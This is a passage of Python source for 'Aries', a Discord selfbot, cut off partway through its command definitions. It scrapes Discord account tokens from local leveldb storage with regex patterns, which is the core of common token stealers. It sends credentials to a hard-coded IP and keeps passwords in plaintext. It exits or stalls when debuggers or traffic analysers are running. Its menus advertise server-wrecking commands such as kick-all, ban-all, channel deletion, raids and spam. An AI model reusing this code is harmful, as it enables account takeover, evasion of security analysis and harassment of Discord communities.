# ///////////////////////////////////////////////////////////////
# All Imports

import os
import re
import bs4
import sys
import json
import time
from discord.ext.commands.core import command
import httpx
import base64
import qrcode
import dhooks
import string
import socket
import urllib
import ctypes
import random
import discum
import psutil
import typing
import aiohttp
import asyncio
import discord
import pyimgur
import hashlib
import pwinput
import bitly_api
import requests
import threading
import pyPrivnote
import subprocess
import pypresence
import webbrowser
import platform
import ipapi
from art import *
from gtts import gTTS
from discord import *
from re import findall
from ctypes import windll
from pytube import YouTube
from os import listdir, name
from time import sleep
from ipwhois import IPWhois
from subprocess import call
from datetime import datetime
from licensing.models import *
from pypresence import Presence
from discord.ext import commands
from urllib.request import urlopen
from urllib.parse import quote_plus
import mysql.connector, hashlib
import mysql as mysql
from time import localtime, strftime
import ctypes.wintypes as wintypes
from win10toast import ToastNotifier
from licensing.methods import Key, Helpers
from colorama import init, Fore, Back, Style
from os import error, name, system
from datetime import datetime as dt
from discord.ext.commands import MissingPermissions, CheckFailure, CommandNotFound, has_permissions
#Extra variables
beta = False

class misc():
    def authenticate():
        
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(('3.135.63.188', 1233))
        response = client.recv(2048)
        # Input UserName
        name = input(response.decode())	
        client.send(str.encode(name))
        response = client.recv(2048)
        # Input Password
        password = input(response.decode())	
        client.send(str.encode(password))
        ''' Response : Status of Connection :
            1 : Registeration successful 
            2 : Connection Successful
            3 : Login Failed
        '''
        # Receive response 
        response = client.recv(2048)
        response = response.decode()

        print(response)
        client.close()
        if beta == True and not os.path.isdir("./data/beta/"):
            os.mkdir("./data/beta")
        with open("./data/beta/authentication.log", "w") as f:
            f.write(f"{name}:{password}")
    def getUserToken(path):
        path += "\\Local Storage\\leveldb"
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens
    def returnAutoToken():
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = {
            "Discord"           : ROAMING + "\\Discord",
            "Discord Canary"    : ROAMING + "\\discordcanary",
        }
        checked = ""

        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
            for token in misc.getUserToken(path):
                if token in checked:
                    continue
                checked += token
        return checked
#print(autoToken.returnAutoToken())
init() # Initialize colorama
#Startup
if (os.path.exists("./data/config.json")):
    pass
else:
    prefix = input("Prefix: ".center(os.get_terminal_size().columns))
    sniper = input("Sniper? (y/n): ".center(os.get_terminal_size().columns))
    fake_nitro_config = input("Fake Nitro? (y/n): ".center(os.get_terminal_size().columns))
    selfbot_detection = input("Selfbot Detector? (y/n)".center(os.get_terminal_size().columns))
    delete_timer = input("Delete Timer: ".center(os.get_terminal_size().columns))
    pingWebhook = input("Ping webhook? (leave blank for none) ")
    configToken = ""
    ISDIR = os.path.isdir("./data")
    if sniper == "y":
        sniper = "true"
    if fake_nitro_config == "y":
        fake_nitro_config == "True"
    if selfbot_detection == "y":
        selfbot_detection = "true"
    
    if (not ISDIR):
        os.mkdir('./data')
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
        "Authorization": f"{misc.returnAutoToken()}"
    }
    r = requests.get("https://discordapp.com/api/v6/users/@me", headers=headers)
    content = r.json()
    username = content.get('username')
    discriminator = content.get('discriminator')
    useFoundTokens = input(f"User Account Found: {username}#{discriminator} Would you like to use it? y/n".center(os.get_terminal_size().columns))
    if not useFoundTokens == "y":
        configToken = input("Token: ")
    else:
        configToken = misc.returnAutoToken()
        
    data = {
            "token": f"{configToken}",
            "prefix": f"{prefix}",
            "sniper": f"{sniper}",
            "selfbot_detection": f"{selfbot_detection}",
            "theme": f"Aries",
            "AFK": f"False",
            "AFK-Message": f"I'm Currently Away!",
            "Fake-Nitro": f"{fake_nitro_config}",
            "Delete_Timer": f"{delete_timer}",
            "Ping Webhook": f"{pingWebhook}"
        }
    if beta:
        misc.authenticate()
    else:
        pass
    with open("./data/config.json", "w") as f:
            f.write(json.dumps(data, indent=4))
    ISDIR = os.path.isdir("./data")
    ISDIR2 = os.path.isdir("./data/themes")
    ISDIR3 = os.path.isdir("./assets")
    ISDIR4 = os.path.isdir("./data/notes")
    ISDIR5 = os.path.isdir("./data/beta")
    ISDIR6 = os.path.isdir("./data/emojis")
    if (not ISDIR):
        os.mkdir('./data')
    else:
        pass
    if (not ISDIR2):
        os.mkdir("./data/themes")
    else:
        pass
    if (not ISDIR3):
        os.mkdir("./assets")
    else:
        pass
    if (not ISDIR4):
        os.mkdir("./data/notes")
    if (not ISDIR6):
        os.mkdir("./data/emojis")
    ISTHEME = os.path.isfile("/data/themes/Aries.json")
    themedata = {
        "title": "Aries",
        "imageurl":"https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif",
        "color": "#FF0000",
        "TColor": "Red"
        }   
    if not ISTHEME:
        with open("./data/themes/Aries.json", "w") as f:
            f.write(json.dumps(themedata, indent=4))
    else:
        pass 
# ///////////////////////////////////////////////////////////////
# Aries Variables

version = "1.0.6 Remastered"
command_amount = "115 "
authSkip = False
motd = "Its getting Chilly!"
start_time = dt.now()
ready = False
with open("./data/config.json") as f:
#Loads the json to read contents
        config = json.load(f)
prefix_config = config.get('prefix')
token_config = config.get('token')
nitro_sniper_config = config.get('sniper')
selfbot_detector_config = config.get('detector')
theme_config = config.get('theme')
afkmode_config = config.get('AFK')
afkmsg_config = config.get("AFK-Message")
deltimer_config = config.get("Delete_Timer")
pingWebhook_config = config.get("Ping Webhook")
afklogging = False
copier = False
person = ""
NitroSound = False
fake_nitro = config.get("Fake-Nitro")
logo = """
                                                      ___         _          
                                                     /   |  _____(_)__  _____
                                                    / /| | / ___/ / _ \/ ___/
                                                   / ___ |/ /  / /  __(__  ) 
                                                  /_/  |_/_/  /_/\___/____/  

"""

# ///////////////////////////////////////////////////////////////
# Aries Class & Functions

class aries:
    def convertString(s): 
        
        # initialize an empty string
        str1 = " " 
        
        # return string  
        return (str1.join(s))
    def console(clear=False, line=False):
        if clear:
            os.system("cls")
        print(Fore.RED + logo + Fore.RESET)
        if line:
            val = os.get_terminal_size().columns
            print(f'═' * val)
    def progressbar(percent=0, width=30):
        # The number of hashes to show is based on the percent passed in. The
        # number of blanks is whatever space is left after.
        hashes = width * percent // 100
        blanks = width - hashes
        print('\r                                          [', hashes*'=', blanks*' ', ']', f' {percent:.0f}%', sep='', end='', flush=True)
    def getTerminalColor():
        with open(f"./data/themes/theme_config.json") as f:
            config = json.load(f)
            color = config.get('TColor')
            if color == "Red":
                return Fore.RED
            elif color == "Blue":
                return Fore.BLUE
            elif color == "Green":
                return Fore.GREEN
            elif color == "Cyan":
                return Fore.CYAN
            elif color == "Reset":
                return Fore.RESET
    def printTyping(text, delay):
        for x in text: 
            print(x, end="")
            sys.stdout.flush()
            time.sleep(delay)
    async def sendEmbed(ctx, description:string):
        await ctx.message.delete()
        with open("./data/config.json") as f:
            config = json.load(f)
        theme = config.get('theme')
        with open(f"./data/themes/{theme_config}.json") as f:
            #Loads the json to read contents
            config = json.load(f)
            color = config.get('color')
            sixteenIntegerHex = int(color.replace("#", ""), 16)
            readableHex = int(hex(sixteenIntegerHex), 0)
            embed = discord.Embed(title=config.get('title'), description = f"{description}", color=readableHex)
            embed.set_thumbnail(url = config.get('imageurl'))
            embed.set_footer(text = "made with ♡ by bomt & Nshout")
            await ctx.send(embed = embed, delete_after=int(deltimer_config))
    async def sendCustomEmbed(ctx, title:string, description:string):
        await ctx.message.delete()
        with open("./data/config.json") as f:
            config = json.load(f)
        theme = config.get('theme')
        with open(f"./data/themes/{theme_config}.json") as f:
            #Loads the json to read contents
            config = json.load(f)
            color = config.get('color')
            sixteenIntegerHex = int(color.replace("#", ""), 16)
            readableHex = int(hex(sixteenIntegerHex), 0)
            embed = discord.Embed(title=f"{title}", description = f"{description}", color=readableHex)
            embed.set_thumbnail(url = config.get('imageurl'))
            embed.set_footer(text = "made with ♡ by bomt & Nshout")
            await ctx.send(embed = embed, delete_after=int(deltimer_config))
    async def sendEmbedNoDelete(ctx, description:string):
        with open("./data/config.json") as f:
            config = json.load(f)
        theme = config.get('theme')
        with open(f"./data/themes/{theme_config}.json") as f:
            #Loads the json to read contents
            config = json.load(f)
            color = config.get('color')
            sixteenIntegerHex = int(color.replace("#", ""), 16)
            readableHex = int(hex(sixteenIntegerHex), 0)
            embed = discord.Embed(title=config.get('title'), description = f"{description}", color=readableHex)
            embed.set_thumbnail(url = config.get('imageurl'))
            embed.set_footer(text = "made with ♡ by bomt & Nshout")
            await ctx.send(embed = embed, delete_after=int(deltimer_config))
    async def sendFullyCustomEmbed(ctx, title:string, description:string, image:string):
        await ctx.message.delete()
        with open("./data/config.json") as f:
            config = json.load(f)
        theme = config.get('theme')
        with open(f"./data/themes/{theme_config}.json") as f:
            #Loads the json to read contents
            config = json.load(f)
            color = config.get('color')
            sixteenIntegerHex = int(color.replace("#", ""), 16)
            readableHex = int(hex(sixteenIntegerHex), 0)
            embed = discord.Embed(title=f"{title}", description = f"{description}", color=readableHex)
            embed.set_thumbnail(url = config.get('imageurl'))
            embed.set_image(url=image)
            embed.set_footer(text = "made with ♡ by bomt & Nshout")
            await ctx.send(embed = embed, delete_after=int(deltimer_config))
# ///////////////////////////////////////////////////////////////
# Security Class & Functions

class security:
    def getHWID():
            s = ""
            s += os.name
            s += str(platform.architecture())
            s += str(platform.version())
            s += str(os.cpu_count())
            s += str(os.getenv("PROCESSOR_IDENTIFIER"))
            s += str(os.getenv("PROCESSOR_ARCHITECTURE"))
            s += str(os.getenv("PROCESSOR_ARCHITEW6432"))
            s += str(os.getenv("NUMBER_OF_PROCESSORS"))
            return hashlib.sha256(s.encode()).hexdigest()
    def autoAuthentication():
        with open('./data/beta/authentication.log') as f:
            lines = f.readlines()
            convertedLine = aries.convertString(lines)
            splitLine = convertedLine.replace(":", " ")
            username = splitLine.partition(" ")[0]
            password = splitLine.partition(" ")[2]
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect the client
        # client.connect((target, port))
        client.connect(('3.135.63.188', 1233))
        response = client.recv(2048)
        # Input UserName
        name = username
        client.send(str.encode(name))
        response = client.recv(2048)
        # Input Password
        password = password
        client.send(str.encode(password))
        response = client.recv(2048)
        #Input Key
       # license = input(response.decode())
       # client.send(str.encode(license))
        ''' Response : Status of Connection :
            1 : Registeration successful 
            2 : Connection Successful
            3 : Login Failed
        '''
        # Receive response 
        response = client.recv(2048)
        response = response.decode()
        
        print(response)
        client.close()

    def authenticate():
        if not os.path.isdir("./data/beta/"):
            os.mkdir("./data/beta")
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect the client
        client.connect(('3.135.63.188', 1233))
        response = client.recv(2048)
        # Input UserName
        name = input(response.decode())	
        client.send(str.encode(name))
        response = client.recv(2048)

        # Input Password
        password = input(response.decode())	
        client.send(str.encode(password))
        response = client.recv(2048)
        #Input Key
        license = input(response.decode())
        client.send(str.encode(license))
        ''' Response : Status of Connection :
            1 : Registeration successful 
            2 : Connection Successful
            3 : Login Failed
        '''
        # Receive response 
        response = client.recv(2048)
        response = response.decode()
        if not os.path.exists("./data/beta/auth.txt"):
            with open("./data/beta/auth.txt", "w") as f:
                f.write(f"{name}:{password}")
        client.close()
    def debuggerCheck(shutdown:bool):
        invalidProc = [ "taskmgr.exe", "httpdebuggersvc.exe", "httpdebuggerui.exe", "burpsuitecommunity.exe", "burpsuite.exe", "java bytecode editor.exe", "classeditor.exe", "fiddler everywhere.exe", "scylla_x64.exe", "megadumper.exe", "cheat engine.exe", "cheatengine.exe", "cheatengine.exe", "javassist.exe","processhacker.exe", "nemesis.exe", "ida.exe", "ida64.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "ksdumperdriver.sys.exe","ksdumper.exe", "dumper.exe", "codecracker.exe", "charles.exe", "dnspy.exe", "simpleassembly.exe", "peek.exe", "httpanalyzer.exe","httpdebug.exe", "fiddler.exe", "wireshark.exe", "dbx.exe", "mdbg.exe", "gdb.exe", "windbg.exe", "dbgclr.exe", "kdb.exe", "kgdb.exe", "mdb.exe","scylla_x86.exe", "scylla.exe", "idau64.exe", "http debugger.exe", "idaq.exe", "idaq64.exe", "idaw.exe", "idaw64.exe", "idag.exe", "recaf.exe","idag64.exe", "importrec.exe", "immunitydebugger.exe", "codebrowser.exe", "reshacker.exe", "hxd.exe", "reflector.exe", "process hacker.exe"]
        for proc in psutil.process_iter():
                processName = proc.name()
                processID = proc.pid
                if processName.lower() in invalidProc:
                    print("Error, Debugger Found!")
                    if (shutdown == True):
                        exit()
                    else:
                        pass
                    time.sleep(60000)
    def isVM(shutdown:bool):
        if hasattr(sys, 'real_prefix'):
             if (shutdown == True):
                exit()
             else:
                pass
# ///////////////////////////////////////////////////////////////
# Files Class & Functions

class files:
    def fileSetup():
        ISDIR = os.path.isdir("./data")
        ISDIR2 = os.path.isdir("./data/themes")
        ISDIR3 = os.path.isdir("./assets")
        ISDIR4 = os.path.isdir("./data/notes")
        ISDIR5 = os.path.isdir("./data/beta")
        ISDIR6 = os.path.isdir("./data/emojis")
        if (not ISDIR):
            os.mkdir('./data')
        else:
            pass
        if (not ISDIR2):
            os.mkdir("./data/themes")
        else:
            pass
        if (not ISDIR3):
            os.mkdir("./assets")
        else:
            pass
        if (not ISDIR4):
            os.mkdir("./data/notes")
        if (not ISDIR5 and beta == True):
            os.mkdir("./data/beta")
        if (not ISDIR6):
            os.mkdir("./data/emojis")
        ISTHEME = os.path.isfile("/data/themes/Aries.json")
        themedata = {
        "title": "Aries",
        "imageurl":"https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif",
        "color": "#FF0000",
        "TColor": "Red"
          }   
        if not ISTHEME:
            with open("./data/themes/Aries.json", "w") as f:
                f.write(json.dumps(themedata, indent=4))
        else:
            pass

    def setup():
        """Creates the necessary folders"""
        ISDIR = os.path.isdir("./data")
        ISDIR2 = os.path.isdir("./data/themes")
        ISDIR3 = os.path.isdir("./assets")
        ISDIR4 = os.path.isdir("./data/notes")
        ISDIR5 = os.path.isdir("./data/beta")
        ISDIR6 = os.path.isdir("./data/emojis")
        if (not ISDIR):
            os.mkdir('./data')
        else:
            pass
        if (not ISDIR2):
            os.mkdir("./data/themes")
        else:
            pass
        if (not ISDIR3):
            os.mkdir("./assets")
        else:
            pass
        if (not ISDIR4):
            os.mkdir("./data/notes")
        if (not ISDIR5 and beta == True):
            os.mkdir("./data/beta")
        if (not ISDIR6):
            os.mkdir("./data/emojis")
        ISTHEME = os.path.isfile("/data/themes/Aries.json")
        themedata = {
        "title": "Aries",
        "imageurl":"https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif",
        "color": "#FF0000",
        "TColor": "Red"
          }   
        if not ISTHEME:
            with open("./data/themes/Aries.json", "w") as f:
                f.write(json.dumps(themedata, indent=4))
        else:
            pass 
        data = {
            "token": f"{token_config}",
            "prefix": f"{prefix_config}",
            "sniper": f"{sniper}",
            "selfbot_detection": f"{selfbot_detection}",
            "theme": f"Aries",
            "AFK": f"False",
            "AFK-Message": f"I'm Currently Away!",
            "Fake-Nitro": f"{fake_nitro_config}",
            "Delete_Timer": f"{delete_timer}"
        }
        with open("./data/config.json", "w") as f:
            f.write(json.dumps(data, indent=4))

    def create_folder(path):
        """Creates a folder"""
        os.mkdir(path)

    def write_file(path, content, byte=False):
        """Writes a file"""
        if byte:
            with open(path, "wb") as f:
                f.write(content)
        else:
            with open(path, 'w') as f:
                f.write(content)
    def download_assets():
        """Downloads assets"""
        url = 'https://cdn.discordapp.com/attachments/811054611116982293/903074932425117696/resizedaries2.png'
        r = requests.get(url, allow_redirects=True)
        open('./assets/resizedaries2.png', 'wb').write(r.content)
        url = 'https://cdn.discordapp.com/attachments/811054611116982293/903074618905096212/ariesnobg.ico'
        r = requests.get(url, allow_redirects=True)
        open('./assets/ariesnobg.ico', 'wb').write(r.content)

# ///////////////////////////////////////////////////////////////
# Functions
def current_theme():
    with open("./data/config.json") as f:
        config = json.load(f)
    theme = config.get('theme')
    return theme
def bot_prefix(bot, message):
    """Get the prefix in the config file"""
    with open("./data/config.json") as f:
        config = json.load(f)
    prefix = config.get('prefix')
    return prefix

bot = commands.Bot(bot_prefix, self_bot=True, case_insensitive=True, guild_subscription_options=GuildSubscriptionOptions.off(), status=Status.dnd)
# ///////////////////////////////////////////////////////////////
# Events
bot.remove_command("help")
@bot.event
async def on_command_error(ctx, error):
    await ctx.message.delete()
    print(f"\n{Fore.LIGHTRED_EX}[Error] {Fore.RESET} - Command Error {Fore.LIGHTRED_EX} {error}")

@bot.event
async def on_ready():
    """Prints a ready log."""
    aries.console(clear=True, line=True)
    r = requests.get("https://pastebin.com/raw/RceT5z9a")
    motd = r.content.decode()
    print("  " + Fore.LIGHTRED_EX + f"{bot.user}".center(os.get_terminal_size().columns) + Fore.RESET + f"{motd}".center(os.get_terminal_size().columns))
    print("    " + Fore.RED + f"{str(len(bot.guilds))}{Fore.RESET} Servers".center(os.get_terminal_size().columns))
    print("    " + Fore.RED + f"{str(len(bot.user.friends))} {Fore.RESET}Friends".center(os.get_terminal_size().columns))
@bot.event
async def on_message(message):
    if (pingWebhook_config != ""):
        try:
            mention = f'<@!{bot.user.id}>'
            if mention in message.content:
                hookURL = str(pingWebhook_config)
                data = hookURL.split("webhooks/",1)[1]
                webhookID = data.split("/", 1)[0]
                tokenID = data.split("/", 1)[1]
                webhook = discord.Webhook.partial(webhookID, f'{tokenID}', adapter=discord.RequestsWebhookAdapter()) # Your webhook
                webhook.send(f'You Were Pinged in: {message.guild} by: {message.author}', username='Aries Webhok Pinger')
        except Exception as e:
            pass
    if (fake_nitro == "True"):
        if (message.author == bot.user and ":kekw:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/905936038080446514.png?size=44")

        if (message.author == bot.user and ":pepeheart:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/836195152103604254.png?size=44")

        if (message.author == bot.user and ":pepecry:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/888517711309721691.png?size=44")
            
        if (message.author == bot.user and ":exactly:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/922883421636800572.gif?size=44")

        if (message.author == bot.user and ":peperave:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/694036644998807592.gif?size=44")

        if (message.author == bot.user and ":picardo:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/891675815832584262.png?size=44")

        if (message.author == bot.user and ":yeetusdeletus:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/886018572453822554.png?size=44")

        if (message.author == bot.user and ":klas:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/901635160871690310.png?size=44")
        
        if (message.author == bot.user and ":sadklas:" in message.content):
            await message.delete()
            await message.channel.send(f"https://cdn.discordapp.com/emojis/901635219101208647.png?size=44")

    #AFK Mode
    if isinstance(message.channel, discord.channel.DMChannel) and message.author != bot.user and afkmode_config == 'True':
       await message.channel.send(f"{afkmsg_config}")
    mention = f'<@!{bot.user.id}>'
    if (mention in message.content and afkmode_config == 'True'):
        await message.channel.send(f"{afkmsg_config}")
    #Copycat
    if message.author.name == person and copier:
         await message.channel.send(message.content)
    
    embeds = message.embeds
    if selfbot_detector_config == 'true':
     for embed in embeds:
        #Gets Embed contents
        getEmbed = embed.to_dict()
        #Converts embed to a string
        convertedEmbed = str(getEmbed)
        #Searches for Luna in contents TODO: Add more checks to improve
        if "Luna" in convertedEmbed:
            #If found print 
         print(Fore.CYAN + "Info" + Fore.RESET + " |" + Fore.RED + " [!]" + Fore.CYAN + " Selfbot Found! On » " + Fore.LIGHTCYAN_EX + str(message.author) + Fore.CYAN + " » Server » " + Fore.LIGHTCYAN_EX + str(message.guild) + Fore.CYAN + " » Selfbot » " + Fore.LIGHTCYAN_EX + "Luna")  

    if nitro_sniper_config == 'true' and 'discord.gift/' in message.content:
        code = re.search("discord.gift/(.*)", message.content).group(1)
        if len(code) >= 16:
            code = re.search("discord.gift/(.*)", message.content).group(1)
            r = requests.post(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', json={'channel_id': message.channel.id}, headers={'authorization': token_config, 'user-agent': 'Mozilla/5.0'})
            r = r.text
            if 'This gift has been redeemed already' in r:
                print(Fore.CYAN + " Info |" + Fore.RED + "[Nitro]" + Fore.CYAN + " Sadly this code has been redeemed already. | " + Fore.RESET + f" Code: {code} | " + Fore.RED + "Error")
            elif 'nitro' in r:
                print(Fore.CYAN + "Info |" + Fore.GREEN + "[Nitro] " + Fore.CYAN + " Nitro Sniped Successfully! | " + Fore.RESET +  f"Code: {code}'")
            elif 'Unknown Gift Code' in r:
                print(Fore.CYAN + "Info | " + Fore.YELLOW + "[Nitro] " + Fore.CYAN + f"An invalid code was posted | Code: {code} | " + Fore.RED + "Error")
            else:
                pass
        else:
          #Checks length for fakes
          print(Fore.YELLOW + f"[!] Detected a fake code: {code}")
    await bot.process_commands(message)    

# ///////////////////////////////////////////////////////////////
# Command
@bot.command()
async def motd(ctx):
    r = requests.get("https://pastebin.com/raw/RceT5z9a")
    motd = r.content.decode()
    await aries.sendEmbed(ctx, motd)
@bot.command()
async def help(ctx):
    global version
    global command_amount
    await aries.sendCustomEmbed(ctx, "Aries Help Menu", f"\nHelp » Display this menu » [{prefix_config}help]\nAdmin » Display the admin page » [{prefix_config}admin]\nFun » Display the fun page » [{prefix_config}fun]\nMisc » Display the Misc page » [{prefix_config}misc]\nNSFW  » Display the NSFW page » [{prefix_config}nsfw]\nSettings » Show the Settings page » [{prefix_config}settings] \nNotes » Display the Aries Notes page » [{prefix_config}notes]\nSquidgames » Display the Squidgames page » [{prefix_config}squidgames]\nAbuse » Display the Abuse page » [{prefix_config}abuse]\nTheme » Display the Themes page » [{prefix_config}theme]\nUtilities » Display the Utilities page » [{prefix_config}utilities]\nSounds » Display the Sounds page » [{prefix_config}Sounds]\nBeta » Display the Beta Info page » [{prefix_config}Beta]\n\n**Aries Version » {version} » Commands » {command_amount} » Prefix » {prefix_config}** ")
@bot.command()
async def text(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Text Menu", f"ASCII Gen » Gen ASCII Text » [{prefix_config}ascii<text>]\nTypewrite » Write some text » [.typewrite <Delay, Message>]\nCodeblock » Write some text in a codeblock » [.codeblock <Mode, Message>]\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def beta(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Beta Menu", f"\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def sounds(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Sounds Menu", f"NitroSound » Toggle NitroSound » [{prefix_config}NitroSound<True/False>]\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def abuse(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Abuse Menu", f"Kickall » Kick all members of a server » [{prefix_config}kickall]\nDelchannels » Delete all server channels » [{prefix_config}delchannels]\nFuck » Nuke a server » [{prefix_config}raid]\nCreatechannels » Create 70 channels » [{prefix_config}createchannels]\nBanAll » Ban all users » [{prefix_config}banall <None>]\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def admin(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Administrator Menu", f"Ban » Ban A Member » [{prefix_config}ban <Person>]\nKick » Kick A Member » [{prefix_config}kick <Person>]\nUnban » Unban a user » [{prefix_config}unban <User>]\nPurge » Purge <> of msgs » [{prefix_config}purge <Amount>] » [Amount]\nCreate » Create a channel » [{prefix_config}Create <Args>]\nDelete » Delete a channel » [{prefix_config}delete <None>]\nListbans » Show all bans » [{prefix_config}listbans <None>]\nNuke » Nukes the channel sent in » [{prefix_config}nuke <None>]\nBanrecord » Saves serv bans to a file » [{prefix_config}banrecord <None>]\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def notes(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Notes Menu", f"CN » Create a note » [{prefix_config}cn <Name, Content>]\nEN » Edit a note » [{prefix_config}en <Newname, Newcontent>]\n\n**<> = Arguments [] = Usage**")
@bot.command()
async def Squidgames(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Squidgames Menu", f"evenorodd » guess even or odd! » [{prefix_config}evenorodd <None>]\nsteppingstones » Are you safe? » [{prefix_config}steppingstones <None>]\n\n**<> = Arguments [] = Usage**")
#Fun Commands
@bot.command()
async def fun(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Fun Menu", f"RollDice » Roll a Number! » [{prefix_config}roll <None>]\nAllah » Talk to ALLAH » [{prefix_config}allah <None>]\nPickup Line » Tell a pickup » [{prefix_config}pickup <None>]\nJoke » Tell a joke » [{prefix_config}joke <None>] \nRickRoll » Rick ur friends ;) » [{prefix_config}rickroll <None>]\nLeave » Leave the current server » [{prefix_config}leave <None>]\nFakeNitro » Sends a Fake Nitro Message » [{prefix_config}fakenitro <None>]\nSpam » Spam a message » [{prefix_config}spam <Delay, amount message>]\nMeme » Send a random meme » [.meme <None>] \nUpload » Upload an img to imgur » [.uploadimg <Image Here>]\nCopycat » Copy a user! » [.copycat <User, True/False>]\nHowgay » How gay is a user? » [.howgay <User>]\nDicksize » How big is a users dick? » [.dicksize <User>]\nInsult » Insult someone! » [.insult <Person>]\nIQ » Get Someones IQ » [.IQ <Person>]\nGhostping » Ghostping someone! » [.ghostping <Person>]\nRocket » Rocket animation in console! » [.rocket <None>]\nFaketoken » Generate a fake discord token » [.faketoken <None>]\nJumpscare » Send a jumpscare » [.jumpscare <None>]\n\n**<> = Arguments [] = Usage**")
#Misc Commands
@bot.command()
async def misc(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Misc Menu", f"Restart » Restarts Aries » [{prefix_config}restart <None>]\nUserinfo » Shows your userinfo » [{prefix_config}userinfo <None>]\nTodo » Shows the bots TODO list » [{prefix_config}todo <None>]\nAvatar » Display Avatar of a user » [{prefix_config}Avatar <User>]\nInvite » Get an invite to Aries » [{prefix_config}ariesinvite <None>]\nEmbed » Sends an Embed message » [{prefix_config}embed <Title, Desc>]\nNick » Change your nickname » [{prefix_config}nick <Newnick>]\nDate » Check the date » [{prefix_config}date <None>]\nTime » Check the time! » [{prefix_config}time <None>] \nServer » Get Server Info! » [{prefix_config}server <None>]\nInvite » Get the server invite! » [{prefix_config}invite] \nSend Noti » Send a windows noti » [{prefix_config}sendnoti <Title, Message>]\nGen Password » Gen a pass » [{prefix_config}genpass <Length>]\nUptime » Check the time sinch Launch » [{prefix_config}uptime <None>] \nEncode b64 » Encode msg using b64 » [{prefix_config}ecb64 <Message>]\nDecode b64 » Decode a b64 msg » [{prefix_config}dcb64 <Message>]\nServerEmojis » Send a list of server emojis » [{prefix_config}serveremojis <None>]\nSpamReact » Spam react to a msg » [{prefix_config}spamreact <MSG ID>]\nCheckBan » Check a hypixel ban » [{prefix_config}checkban <uuid, banid>]\nFolder » Open the Aries folder » [{prefix_config}folder <None>]\nFakeCard » fake credit card » [{prefix_config}fakecreditcard <None>]\nPoop » Send pictures of poop » [{prefix_config}poop <None>]\n\n**<> = Arguments [] = Usage**")
#NSFW Commands
@bot.command()
async def nsfw(ctx):
    await aries.sendCustomEmbed(ctx, "Aries NSFW Menu", f"Boobs » Shows boobs » [{prefix_config}boobs <None>]\nHentai » shows hentai » [{prefix_config}hentai <None>]\nPussy » Show pussy » [{prefix_config}pussy <None>]\nHentaiGif » shows hentai gif » [{prefix_config}hentaigif <None>]\nThighs » Shows thighs » [{prefix_config}thighs <None>]\nPenis » Shows Penis » [{prefix_config}Penis <None>]\nMilf » Shows Milf's » [{prefix_config}Milf <None>]\nAss » Shows Ass » [{prefix_config}Ass <None>]\nDilf » Shows Dilf's » [{prefix_config}Dilf <None>]\nFoodPorn » Shows Food Porn » [{prefix_config}foodporn <None>]\nPorngif » Shows Gifs of porn » [{prefix_config}Porngif <None>]\n\n**<> = Arguments [] = Usage**")
#Theme Commands
@bot.command()
async def theme(ctx):
    await aries.sendCustomEmbed(ctx, "Aries Themes Menu", f"settheme » Set your theme »[{prefix_config}settheme <ThemeName>]\nuploadtheme » Upload a theme » [{prefix_config}uploadtheme <ThemeName>]\ncreatetheme » Create a New Theme » [{prefix_config}createtheme <name, title, imageurl, color>]\nedittheme » Edit a theme » [{prefix_config}edittheme <name, newtitle, newimage, newcolor>]\ninstalltheme » Install a Theme » [{prefix_config}installtheme <Name>]\n\n**<> = Arguments [] = Usage**")
#Attack Commands
@bot.command()
async def utilities(ctx):
